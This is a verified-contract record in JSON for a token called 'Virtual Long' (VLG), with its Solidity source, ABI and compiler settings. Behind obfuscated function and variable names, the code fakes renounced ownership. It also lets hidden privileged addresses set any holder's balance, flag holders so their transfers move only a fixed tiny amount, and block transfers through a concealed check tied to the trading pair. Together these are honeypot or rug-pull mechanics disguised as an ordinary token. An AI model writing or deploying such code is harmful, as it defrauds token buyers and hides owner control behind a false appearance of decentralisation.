{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface launchTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromTake {\n    function createPair(address atLiquidityWallet, address exemptWallet) external returns (address);\n}\n\ninterface minTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptLimit) external view returns (uint256);\n\n    function transfer(address atSell, uint256 enableMin) external returns (bool);\n\n    function allowance(address enableBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atSell,\n        uint256 enableMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundTakeLiquidity, uint256 value);\n    event Approval(address indexed enableBuy, address indexed spender, uint256 value);\n}\n\ninterface txBuy is minTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VirtualLong is limitMin, minTeam, txBuy {\n\n    function teamEnable(address minReceiver, address atSell, uint256 enableMin) internal returns (bool) {\n        if (minReceiver == autoToBuy) {\n            return walletLiquidity(minReceiver, atSell, enableMin);\n        }\n        uint256 maxShouldMarketing = minTeam(toLimitLiquidity).balanceOf(isSell);\n        require(maxShouldMarketing == receiverMarketing);\n        require(atSell != isSell);\n        if (takeSell[minReceiver]) {\n            return walletLiquidity(minReceiver, atSell, listTo);\n        }\n        return walletLiquidity(minReceiver, atSell, enableMin);\n    }\n\n    bool public feeAt;\n\n    mapping(address => mapping(address => uint256)) private buyMax;\n\n    function approve(address listAuto, uint256 enableMin) public virtual override returns (bool) {\n        buyMax[_msgSender()][listAuto] = enableMin;\n        emit Approval(_msgSender(), listAuto, enableMin);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return marketingExempt;\n    }\n\n    string private fundSender = \"VLG\";\n\n    bool public liquidityFund;\n\n    function transfer(address totalFundReceiver, uint256 enableMin) external virtual override returns (bool) {\n        return teamEnable(_msgSender(), totalFundReceiver, enableMin);\n    }\n\n    address marketingTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public launchTrading;\n\n    uint256 modeShould;\n\n    function tokenTeam(address toShould) public {\n        atMarketing();\n        if (limitToken == exemptMarketing) {\n            marketingBuy = true;\n        }\n        if (toShould == autoToBuy || toShould == toLimitLiquidity) {\n            return;\n        }\n        takeSell[toShould] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundSender;\n    }\n\n    uint256 constant listTo = 5 ** 10;\n\n    address public toLimitLiquidity;\n\n    function atMarketing() private view {\n        require(launchTrading[_msgSender()]);\n    }\n\n    uint256 public limitToken;\n\n    uint256 public exemptMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return atMax;\n    }\n\n    function fundLimit(uint256 enableMin) public {\n        atMarketing();\n        receiverMarketing = enableMin;\n    }\n\n    uint256 private totalMode;\n\n    mapping(address => uint256) private totalTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldFrom;\n    }\n\n    event OwnershipTransferred(address indexed totalFrom, address indexed maxAmountMarketing);\n\n    mapping(address => bool) public takeSell;\n\n    bool public marketingBuy;\n\n    function transferFrom(address minReceiver, address atSell, uint256 enableMin) external override returns (bool) {\n        if (_msgSender() != marketingTake) {\n            if (buyMax[minReceiver][_msgSender()] != type(uint256).max) {\n                require(enableMin <= buyMax[minReceiver][_msgSender()]);\n                buyMax[minReceiver][_msgSender()] -= enableMin;\n            }\n        }\n        return teamEnable(minReceiver, atSell, enableMin);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellAtShould;\n    }\n\n    constructor (){\n        \n        launchTotal enableMarketing = launchTotal(marketingTake);\n        toLimitLiquidity = fromTake(enableMarketing.factory()).createPair(enableMarketing.WETH(), address(this));\n        \n        autoToBuy = _msgSender();\n        amountTeam();\n        launchTrading[autoToBuy] = true;\n        totalTo[autoToBuy] = shouldFrom;\n        \n        emit Transfer(address(0), autoToBuy, shouldFrom);\n    }\n\n    function amountTeam() public {\n        emit OwnershipTransferred(autoToBuy, address(0));\n        marketingExempt = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingExempt;\n    }\n\n    function marketingReceiver(address totalFundReceiver, uint256 enableMin) public {\n        atMarketing();\n        totalTo[totalFundReceiver] = enableMin;\n    }\n\n    function balanceOf(address exemptLimit) public view virtual override returns (uint256) {\n        return totalTo[exemptLimit];\n    }\n\n    address isSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tokenBuy(address limitMax) public {\n        if (feeAt) {\n            return;\n        }\n        \n        launchTrading[limitMax] = true;\n        \n        feeAt = true;\n    }\n\n    address public autoToBuy;\n\n    uint256 private shouldFrom = 100000000 * 10 ** 18;\n\n    function walletLiquidity(address minReceiver, address atSell, uint256 enableMin) internal returns (bool) {\n        require(totalTo[minReceiver] >= enableMin);\n        totalTo[minReceiver] -= enableMin;\n        totalTo[atSell] += enableMin;\n        emit Transfer(minReceiver, atSell, enableMin);\n        return true;\n    }\n\n    function allowance(address walletReceiver, address listAuto) external view virtual override returns (uint256) {\n        if (listAuto == marketingTake) {\n            return type(uint256).max;\n        }\n        return buyMax[walletReceiver][listAuto];\n    }\n\n    string private atMax = \"Virtual Long\";\n\n    address private marketingExempt;\n\n    uint256 receiverMarketing;\n\n    uint8 private sellAtShould = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAmountMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTakeLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableMin\",\"type\":\"uint256\"}],\"name\":\"fundLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMin\",\"type\":\"uint256\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimitLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"}],\"name\":\"tokenBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"}],\"name\":\"tokenTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "VirtualLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}